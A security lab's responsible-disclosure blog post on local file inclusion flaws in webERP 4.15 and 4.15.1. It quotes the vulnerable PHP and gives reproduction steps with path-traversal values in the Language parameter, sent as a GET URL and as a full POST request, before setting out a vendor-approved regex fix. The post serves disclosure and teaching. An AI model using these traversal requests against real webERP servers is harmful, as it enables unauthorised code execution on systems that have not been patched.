=== Content from lyhinslab.org_883105c5_20250119_130049.html ===


[## Lyhins' Lab

LSCP Responsible Disclosure Lab](https://lyhinslab.org/)

Menu

* [Home](https://lyhinslab.org/)
* [How the lab works](https://lyhinslab.org/index.php/how-the-lab-works/)

# How White-Box hacking works: webERP Local File Inclusion

May 16, 2020
  |  [No Comments](https://lyhinslab.org/index.php/2020/05/16/weberp-lfi/#respond)

In the [previous post](https://lyhinslab.org/index.php/2020/03/14/inoerp-ab-rce/) we described a couple of inoERP bugs and made a conclusion that inoERP software is too buggy for everyday usage. So we tried to find a better open-source alternative, and possibly save 600 dollars per user per month on Oracle Financials for somebody. Fortunately, we found that webERP still releases updates and has GNU General Public License (GPL) v2, so we decided to check it for easily reachable vulnerabilities.

#### Bug discovery

To discover the bug, we used “grep” binary to find each call to “include” or “require” function that also operates with any variables, and then reviewed the results manually.

```
 egrep '(include|require)(\ |\()(.*)(\$)' /var/www/html -ri
```

We had a look on webERP 4.15 and webERP 4.15.1.

#### WebERP v4.15 – Unauthenticated Local File Inclusion

In webERP 4.15, the code lines 22-25 of “ManualContents.php” file allow user to specify “Language” parameter. This leads to Local File Inclusion, at least in line 59. Also note line 32.

```
$Title = _('webERP Manual');
// Set the language to show the manual:
session_start();
$Language = $_SESSION['Language'];
if(isset($_GET['Language'])) {// Set an other language for manual.
        $Language = $_GET['Language'];
}
// Set the Cascading Style Sheet for the manual:
$ManualStyle = 'locale/' . $Language . '/Manual/style/manual.css';
if(!file_exists($ManualStyle)) {// If locale ccs not exist, use doc/Manual/style/manual.css. Each language can have its own css.
        $ManualStyle = 'doc/Manual/style/manual.css';
}
// Set the the outline of the webERP manual:
$ManualOutline = 'locale/' . $Language . '/Manual/ManualOutline.php';
if(!file_exists($ManualOutline)) {// If locale outline not exist, use doc/Manual/ManualOutline.php. Each language can have its own outline.
        $ManualOutline = 'doc/Manual/ManualOutline.php';
}

ob_start();

// Output the header part:
$ManualHeader = 'locale/' . $Language . '/Manual/ManualHeader.html';
if(file_exists($ManualHeader)) {// Use locale ManualHeader.html if exists. Each language can have its own page header.
        include($ManualHeader);
} else {// Default page header:
        echo '<!DOCTYPE html>
        <html>
        <head>
          <title>', $Title, '</title>
          <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
          <link rel="stylesheet" type="text/css" href="', $ManualStyle, '" />
        </head>
        <body lang="', str_replace('_', '-', substr($Language, 0, 5)), '">
                <div id="pagetitle">', $Title, '</div>
                <div class="right">
                        <a id="top"> </a><a class="minitext" href="', htmlspecialchars($_SERVER['PHP_SELF'],ENT_QUOTES,'UTF-8'), '">☜ ', _('Table of Contents'), '</a><br />
                        <a class="minitext" href="#bottom">⬇ ', _('Go to Bottom'), '</a>
                </div>';
}

include($ManualOutline);

```

For simplicity, we deployed an Ubuntu machine with webERP v4.15, and deployed an FTP service. Then we did the next:

1. As an FTP user we created a directory and a file, /srv/ftp/upload/Manual/ManualContents.php, and put call to the phpinfo function.
2. As a web user, we sent GET request with Language GET parameter:
   <http://192.168.100.2:8080/webERP/ManualContents.php?Language=../../../../../../../../srv/ftp/upload>

![](https://lyhinslab.org/wp-content/uploads/2020/05/image-1.png)
#### WebERP v4.15.1 – Authenticated Local File Inclusion

In webERP 4.15.1, the developers commented out the code lines that take the Language parameter from the user input in ManualContents.php. ManualContents.php is now accessible after the authorization only, but user can specify the Language parameter in POST request. Look at “includes/LanguageSetup.php”, lines 15-23.

```
If (isset($_POST['Language'])) {
	$_SESSION['Language'] = $_POST['Language'];
	$Language = $_POST['Language'];
} elseif (!isset($_SESSION['Language'])) {
	$_SESSION['Language'] = $DefaultLanguage;
	$Language = $DefaultLanguage;
} else {
	$Language = $_SESSION['Language'];
}
//Check users' locale format via their language
//Then pass this information to the js for number validation purpose

$Collect = array(
	'US'=>array('en_US.utf8','en_GB.utf8','ja_JP.utf8','hi_IN.utf8','mr_IN.utf8','sw_KE.utf8','tr_TR.utf8','vi_VN.utf8','zh_CN.utf8','zh_HK.utf8','zh_TW.utf8'),
	'IN'=>array('en_IN.utf8','hi_IN.utf8','mr_IN.utf8'),
	'EE'=>array('ar_EG.utf8','cz_CZ.utf8','fr_CA.utf8','fr_FR.utf8','hr_HR.utf8','pl_PL.utf8','ru_RU.utf8','sq_AL.utf8','sv_SE.utf8'),
	'FR'=>array('ar_EG.utf8','cz_CZ.utf8','fr_CA.utf8','fr_FR.utf8','hr_HR.utf8','pl_PL.utf8','ru_RU.utf8','sq_AL.utf8','sv_SE.utf8'),
	'GM'=>array('de_DE.utf8','el_GR.utf8','es_ES.utf8','fa_IR.utf8','id_ID.utf8','it_IT.utf8','ro_RO.utf8','lv_LV.utf8','nl_NL.utf8','pt_BR.utf8','pt_PT.utf8'));

foreach($Collect as $Key=>$Value) {
	if(in_array($Language,$Value)) {
		$Lang = $Key;
		$_SESSION['Lang'] = $Lang;
	}
}

```

So we deployed webERP v4.15.1 on the same virtual server, then did the next steps:

1. Check that the file “/srv/ftp/upload/Manual/ManualContents.php” contains the right payload
2. Authenticate as a regular webERP user with the default credentials
3. Send a POST request to ManualContents.php, with Language body parameter.
4. Navigate to ManualContents.php in a browser.

![](https://lyhinslab.org/wp-content/uploads/2020/05/image-2.png)

Request:

```
POST /ManualContents.php HTTP/1.1
Host: 192.168.100.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSIDwebERPteam=abumh3e3ak5ert1afcrpjkl02p
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

Language=../../../../../../../srv/ftp/upload
```
#### Recommendation

WebERP support team fixed these vulnerabilities and promised to release a new update on the previous week. So update the webERP application to the latest version as soon as it will be released.
But at the moment, Lyhin’s Lab recommends to change the code at includes/LanguageSetup.php, lines 15-23

```
If (isset($_POST['Language'])) {
	$_SESSION['Language'] = $_POST['Language'];
	$Language = $_POST['Language'];
} elseif (!isset($_SESSION['Language'])) {
	$_SESSION['Language'] = $DefaultLanguage;
	$Language = $DefaultLanguage;
} else {
	$Language = $_SESSION['Language'];
}
```

To:

```
if (isset($_POST['Language'])) {
	if (preg_match("/^([a-z]{2}\_[A-Z]{2})(\.utf8)$/", $_POST['Language'])) $_SESSION['Language'] = $_POST['Language'];
} else {
	$_SESSION['Language'] = $DefaultLanguage;
	$Language = $DefaultLanguage;
}
$Language = $_SESSION['Language'];
```

This change was approved by the webERP support team.

*LL advises to all the researchers do not break real applications* *illegally. This fun leads to broken businesses and lives, and, most likely, will not make an attacker really rich.*

# Post navigation

[← Lifehacks for hackers: Clipboard File Transfer stable script](https://lyhinslab.org/index.php/2020/04/11/lifehacks-for-hackers-clipboard-file-transfer-stable-script/) [Lifehacks for hackers: When to relax and when to do not →](https://lyhinslab.org/index.php/2020/06/13/lifehacks-for-hackers-when-to-relax-and-when-to-do-not/)

### Leave a Reply [Cancel reply](/index.php/2020/05/16/weberp-lfi/#respond)

You must be [logged in](https://lyhinslab.org/wp-login.php?redirect_to=https%3A%2F%2Flyhinslab.org%2Findex.php%2F2020%2F05%2F16%2Fweberp-lfi%2F) to post a comment.

### Recent Posts

* [LL](https://lyhinslab.org/index.php/2022/10/25/temporary-llab-suspension/)
* [How White-Box hacking works: InvoicePlane – A Lot Of XSS And A Couple Of BAC Vulnerabilities](https://lyhinslab.org/index.php/2022/01/27/how-white-box-hacking-works-invoiceplane-a-lot-of-xss-and-a-couple-of-bac-vulnerabilities/)
* [Lifehacks for hackers: what certification next?](https://lyhinslab.org/index.php/2021/12/30/lifehacks-for-hackers-what-certification-next/)
* [How White-Box hacking works: XSS + CSRF in Arunna](https://lyhinslab.org/index.php/2021/11/29/how-white-box-hacking-works-xss-csrf-in-arunna/)
* [Lifehacks for hackers: The value of “No”.](https://lyhinslab.org/index.php/2021/10/28/lifehacks-for-hackers-the-value-of-no/)
### Recent Comments

### Archives

* [October 2022](https://lyhinslab.org/index.php/2022/10/)
* [January 2022](https://lyhinslab.org/index.php/2022/01/)
* [December 2021](https://lyhinslab.org/index.php/2021/12/)
* [November 2021](https://lyhinslab.org/index.php/2021/11/)
* [October 2021](https://lyhinslab.org/index.php/2021/10/)
* [September 2021](https://lyhinslab.org/index.php/2021/09/)
* [August 2021](https://lyhinslab.org/index.php/2021/08/)
* [July 2021](https://lyhinslab.org/index.php/2021/07/)
* [June 2021](https://lyhinslab.org/index.php/2021/06/)
* [May 2021](https://lyhinslab.org/index.php/2021/05/)
* [April 2021](https://lyhinslab.org/index.php/2021/04/)
* [March 2021](https://lyhinslab.org/index.php/2021/03/)
* [February 2021](https://lyhinslab.org/index.php/2021/02/)
* [January 2021](https://lyhinslab.org/index.php/2021/01/)
* [December 2020](https://lyhinslab.org/index.php/2020/12/)
* [November 2020](https://lyhinslab.org/index.php/2020/11/)
* [October 2020](https://lyhinslab.org/index.php/2020/10/)
* [September 2020](https://lyhinslab.org/index.php/2020/09/)
* [August 2020](https://lyhinslab.org/index.php/2020/08/)
* [July 2020](https://lyhinslab.org/index.php/2020/07/)
* [June 2020](https://lyhinslab.org/index.php/2020/06/)
* [May 2020](https://lyhinslab.org/index.php/2020/05/)
* [April 2020](https://lyhinslab.org/index.php/2020/04/)
* [March 2020](https://lyhinslab.org/index.php/2020/03/)
### Categories

* [Uncategorized](https://lyhinslab.org/index.php/category/uncategorized/)
### Meta

* [Log in](https://lyhinslab.org/wp-login.php)
* [Entries feed](https://lyhinslab.org/index.php/feed/)
* [Comments feed](https://lyhinslab.org/index.php/comments/feed/)
* [WordPress.org](https://wordpress.org/)

© S. Lyhin 2025. All rights reserved.


